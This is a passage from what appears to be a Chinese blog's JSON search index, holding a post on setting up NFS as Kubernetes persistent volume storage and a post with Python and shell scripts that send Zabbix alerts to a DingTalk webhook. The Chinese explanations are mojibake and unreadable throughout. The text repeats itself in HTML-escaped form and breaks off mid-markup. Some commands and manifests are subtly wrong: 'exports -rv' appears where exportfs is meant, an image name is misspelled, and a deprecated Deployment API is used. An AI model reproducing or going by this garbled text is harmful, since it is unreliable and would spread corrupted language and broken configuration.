10.10.0.0/16(rw,all_squash,insecure,sync)\u0026#34; \u0026gt;\u0026gt; /etc/exports exportfs -r systemctl enable rpcbind nfs-server systemctl restart rpcbind nfs-server showmount -e localhost #å®¢æˆ·ç«¯æ ¹æœ¬ä¸è£…ä¹Ÿå¯ä»¥ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦å¯åŠ¨ä»»ä½•nfsæœåŠ¡ #åªæ˜¯ä¸ºäº†ä½¿ç”¨showmountå·¥å…·æ¥éªŒè¯ #NFSå®¢æˆ·ç«¯ï¼ˆCentOSï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰ yum install -y nfs-utils #NFSå®¢æˆ·ç«¯ï¼ˆUbuntuï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰ apt install -y nfs-common NFS æœåŠ¡ç«¯çš„å‚æ•°å¦‚ä¸‹ï¼š\nrw èƒ½è¯»èƒ½å†™ insecure NFSé€šè¿‡1024ä»¥ä¸Šçš„ç«¯å£å‘é€ root_squash rootä¼šè¢«å˜æˆnobobyï¼Œå…¶ä»–äººä¸å˜ no_root_squash rootèº«ä»½ä¿æŒä¸å˜ï¼Œå…¶ä»–äººä¸å˜ã€‚ï¼ˆä¸èƒ½ç”¨è¿™ä¸ªï¼Œå®¹æ˜“è¢«é»‘ï¼‰ all_squash ä¸è®ºç™»å…¥NFSçš„ä½¿ç”¨è€…èº«ä»½ä¸ºä½•ï¼Œä»–çš„èº«ä»½éƒ½ä¼šè¢«å‹ç¼©æˆä¸ºåŒ¿åä½¿ç”¨è€…ï¼Œé€šå¸¸ä¹Ÿå°±æ˜¯nobody sync æ•°æ®ç›´æ¥è½ç›˜ï¼Œæ€§èƒ½ç•¥æŸã€‚ async æ•°æ®å…ˆè½å†…å­˜ï¼Œç„¶åè½ç›˜ï¼Œæ€§èƒ½ç•¥å‡ã€‚ ç»¼ä¸Šï¼Œä¿é™©çš„å‚æ•°å°±æ˜¯\n/data/nfs 10.10.0.0/16(rw,insecure,all_squash,sync) æ³¨æ„ï¼šä¿®æ”¹äº†/etc/exportsåï¼Œå¹¶ä¸éœ€è¦é‡å¯nfsæœåŠ¡ï¼Œåªè¦ç”¨exportfsé‡æ–°æ‰«æä¸€æ¬¡/etc/exportsï¼Œå¹¶ä¸”é‡æ–°åŠ è½½å³å¯\nexports -rv äºŒã€PODå†…ç›´æ¥ä½¿ç”¨ ç”±äºnfsæ˜¯å†…æ ¸è‡ªå¸¦çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æœ€ç®€å•çš„ä½¿ç”¨æ–¹æ³•å°±æ˜¯ç›´æ¥åœ¨podå†…ä½¿ç”¨\napiVersion: v1 kind: Pod metadata: name: test labels: app.kubernetes.io/name: alpine spec: containers: - name: alpine image: alpine:latest command: - touch - /data/test volumeMounts: - name: nfs-volume mountPath: /data volumes: - name: nfs-volume nfs: server: 10.10.247.38 path: /data readOnly: no è¿™ä¸ªpodæ˜¯ä¸€æ¬¡æ€§è¿è¡Œçš„ï¼Œè¿è¡Œå®Œåå°±å¯ä»¥çœ‹åˆ°nfsä¸­å¤šäº†ä¸ªtestæ–‡ä»¶\nä¸‰ã€ç”¨PVå’ŒPVCä½¿ç”¨ å…ˆå»ºç«‹PVï¼Œæ³¨æ„ç­–ç•¥æ˜¯Retainï¼Œä¸ä¼šä¸¢æ•°æ®ã€‚å¦‚æœæ˜¯Recycleä¼šæ¸…æ´—æ•°æ®\napiVersion: v1 kind: PersistentVolume metadata: name: nfs-pv-pvname spec: accessModes: - ReadWriteOnce - ReadOnlyMany - ReadWriteMany capacity: storage: 10Gi storageClassName: \u0026#34;\u0026#34; persistentVolumeReclaimPolicy: Retain volumeMode: Filesystem nfs: server: 10.10.247.38 path: /data readOnly: no ç„¶åå»ºç«‹ PVC\napiVersion: v1\rkind: PersistentVolumeClaim\rmetadata:\rname: nfs-pvc-pvcname\rspec:\raccessModes:\r- ReadWriteMany\rresources:\rrequests:\rstorage: 1Gi å»ºä¸€ä¸ªDeploymentï¼Œç”¨ä¸€ä¸‹\napiVersion: extensions/v1beta1 kind: Deployment metadata: name: nfs-pvc spec: replicas: 1 template: metadata: labels: app: nfs-pvc spec: containers: - name: nginx image: alphine/nginx:latest imagePullPolicy: IfNotPresent ports: - containerPort: 80 name: web #ä½¿ç”¨volume volumeMounts: - name: www subPath: nginx-pvc #è¿œç¨‹å­è·¯å¾„ mountPath: /usr/share/nginx/html volumes: - name: www persistentVolumeClaim: claimName: nfs-pvc-pvcname æ³¨æ„ï¼š\nStorage 10Gi 1Gi è¿™éƒ½æ˜¯éª—é¬¼ç©å„¿å‘¢ï¼Œæ ¹æœ¬ä¸èµ·ä»»ä½•ä½œç”¨ï¼ï¼ï¼ ","permalink":"https://rendoumi.com/posts/20221124-k8s_nfs/","summary":"\u003cp\u003eç”¨NFSæ¥åškubernetesçš„æŒä¹…åŒ–å·è™½ç„¶ä¸æ˜¯æœ€ä½³å®è·µï¼Œä½†å­˜åœ¨å³åˆç†ã€‚åœ¨ç°åœ¨çš„å…¬å¸å°±æ˜¯è¿™ä¹ˆç”¨çš„ï¼Œè®°å½•ä¸€ä¸‹ï¼Œå¯ç”¨ä½†ä¸æ˜¯æœ€ä½³ã€‚\u003c/p\u003e\n\u003ch4 id=\"ä¸€æ­å»ºnfsæœåŠ¡ç«¯å’Œæ‰€æœ‰å·¥ä½œèŠ‚ç‚¹å®‰è£…å®¢æˆ·ç«¯\"\u003eä¸€ã€æ­å»ºNFSæœåŠ¡ç«¯å’Œæ‰€æœ‰å·¥ä½œèŠ‚ç‚¹å®‰è£…å®¢æˆ·ç«¯\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#NFSæœåŠ¡ç«¯ (centos7)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install nfs-utils rpcbind -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/nfs/\u003cspan class=\"o\"\u003e{\u003c/span\u003edownload,bakup,www\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/data/nfs 10.10.0.0/16(rw,all_squash,insecure,sync)\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /etc/exports\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexportfs -r\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl \u003cspan class=\"nb\"\u003eenable\u003c/span\u003e rpcbind nfs-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart rpcbind nfs-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eshowmount -e localhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å®¢æˆ·ç«¯æ ¹æœ¬ä¸è£…ä¹Ÿå¯ä»¥ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦å¯åŠ¨ä»»ä½•nfsæœåŠ¡\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åªæ˜¯ä¸ºäº†ä½¿ç”¨showmountå·¥å…·æ¥éªŒè¯\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#NFSå®¢æˆ·ç«¯ï¼ˆCentOSï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y nfs-utils\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#NFSå®¢æˆ·ç«¯ï¼ˆUbuntuï¼Œæ‰€æœ‰WorkNodeèŠ‚ç‚¹éƒ½éœ€è¦æ‰§è¡Œï¼‰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eapt install -y nfs-common\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eNFS æœåŠ¡ç«¯çš„å‚æ•°å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erw èƒ½è¯»èƒ½å†™\u003c/li\u003e\n\u003cli\u003einsecure NFSé€šè¿‡1024ä»¥ä¸Šçš„ç«¯å£å‘é€\u003c/li\u003e\n\u003cli\u003eroot_squash rootä¼šè¢«å˜æˆnobobyï¼Œå…¶ä»–äººä¸å˜\u003c/li\u003e\n\u003cli\u003eno_root_squash rootèº«ä»½ä¿æŒä¸å˜ï¼Œå…¶ä»–äººä¸å˜ã€‚ï¼ˆä¸èƒ½ç”¨è¿™ä¸ªï¼Œå®¹æ˜“è¢«é»‘ï¼‰\u003c/li\u003e\n\u003cli\u003eall_squash ä¸è®ºç™»å…¥NFSçš„ä½¿ç”¨è€…èº«ä»½ä¸ºä½•ï¼Œä»–çš„èº«ä»½éƒ½ä¼šè¢«å‹ç¼©æˆä¸ºåŒ¿åä½¿ç”¨è€…ï¼Œé€šå¸¸ä¹Ÿå°±æ˜¯nobody\u003c/li\u003e\n\u003cli\u003esync æ•°æ®ç›´æ¥è½ç›˜ï¼Œæ€§èƒ½ç•¥æŸã€‚\u003c/li\u003e\n\u003cli\u003easync æ•°æ®å…ˆè½å†…å­˜ï¼Œç„¶åè½ç›˜ï¼Œæ€§èƒ½ç•¥å‡ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eç»¼ä¸Šï¼Œä¿é™©çš„å‚æ•°å°±æ˜¯\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e/data/nfs 10.10.0.0/16(rw,insecure,all_squash,sync)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eæ³¨æ„ï¼šä¿®æ”¹äº†/etc/exportsåï¼Œå¹¶ä¸éœ€è¦é‡å¯nfsæœåŠ¡ï¼Œåªè¦ç”¨exportfsé‡æ–°æ‰«æä¸€æ¬¡/etc/exportsï¼Œå¹¶ä¸”é‡æ–°åŠ è½½å³å¯\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexports -rv\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"äºŒpodå†…ç›´æ¥ä½¿ç”¨\"\u003eäºŒã€PODå†…ç›´æ¥ä½¿ç”¨\u003c/h4\u003e\n\u003cp\u003eç”±äºnfsæ˜¯å†…æ ¸è‡ªå¸¦çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æœ€ç®€å•çš„ä½¿ç”¨æ–¹æ³•å°±æ˜¯ç›´æ¥åœ¨podå†…ä½¿ç”¨\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003eapiVersion\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ev1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003ekind\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ePod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003etest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp.kubernetes.io/name\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ealpine\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ealpine\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ealpine:latest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003etouch\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"l\"\u003e/data/test\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumeMounts\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enfs-volume\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003emountPath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/data\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumes\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enfs-volume\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003enfs\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eserver\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e10.10.247.38\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/data\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003ereadOnly\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003eno\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™ä¸ªpodæ˜¯ä¸€æ¬¡æ€§è¿è¡Œçš„ï¼Œè¿è¡Œå®Œåå°±å¯ä»¥çœ‹åˆ°nfsä¸­å¤šäº†ä¸ªtestæ–‡ä»¶\u003c/p\u003e","title":"kubernetesä½¿ç”¨nfsåšæŒä¹…åŒ–å·å­˜å‚¨"},{"content":"#!/usr/bin/env python #coding:utf-8 #zabbixé’‰é’‰æŠ¥è­¦ import requests import json import sys import os import datetime #è¿™é‡Œæ˜¯è‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook webhook=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34; user=sys.argv[1] text=sys.argv[3] data={ \u0026#34;msgtype\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;text\u0026#34;: { \u0026#34;content\u0026#34;: text }, \u0026#34;at\u0026#34;: { \u0026#34;atMobiles\u0026#34;: [ user ], \u0026#34;isAtAll\u0026#34;: False } } headers = {\u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39;} x=requests.post(url=webhook,data=json.dumps(data),headers=headers) ä¸‹é¢æ”¾shellè„šæœ¬çš„\n#!/bin/bash function ddmsg() { Token=\u0026#34;xxxxxxxxxxxx\u0026#34; Weburl=\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=\u0026#34; curl -ks -m 2 \u0026#34;${Weburl}${Token}\u0026#34; \\ -H \u0026#39;Content-Type: application/json;charset=utf-8\u0026#39; \\ -d \u0026#34;{\u0026#39;msgtype\u0026#39;: \u0026#39;text\u0026#39;, \u0026#39;text\u0026#39;: { \u0026#39;content\u0026#39;: \u0026#39;$*\u0026#39;} }\u0026#34; \u0026amp;\u0026gt;/tmp/ddmsg.log if [ `grep \u0026#34;errmsg.*ok\u0026#34; /tmp/ddmsg.log |wc -l` -ne 1 ]; then echo \u0026#39;send error !\u0026#39;;cat /tmp/ddmsg.log;exit 1; fi } #æµ‹è¯•å†…å®¹ echo \u0026#34;@è­¦æŠ¥ ä¸»æœº:$(hostname) ä¿¡æ¯:Node test æ—¶é—´:$(date +\u0026#34;%F %T\u0026#34;) \u0026#34;\u0026gt;.msg cat .msg ddmsg \u0026#34;`cat .msg`\u0026#34; ","permalink":"https://rendoumi.com/posts/20221123-dingding/","summary":"\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"ch\"\u003e#!/usr/bin/env python\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#coding:utf-8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#zabbixé’‰é’‰æŠ¥è­¦\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003eos\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003edatetime\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è¿™é‡Œæ˜¯è‡ªå·±åˆ›å»ºçš„æœºå™¨äººçš„webhook\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ewebhook\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;https://oapi.dingtalk.com/robot/send?access_token=xxxxxx\u0026#34;\u003c/span\u003e      \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003euser\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esys\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eargv\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;msgtype\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;text\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"s2\"\u003e\u0026#34;content\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003etext\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e},\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;at\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan 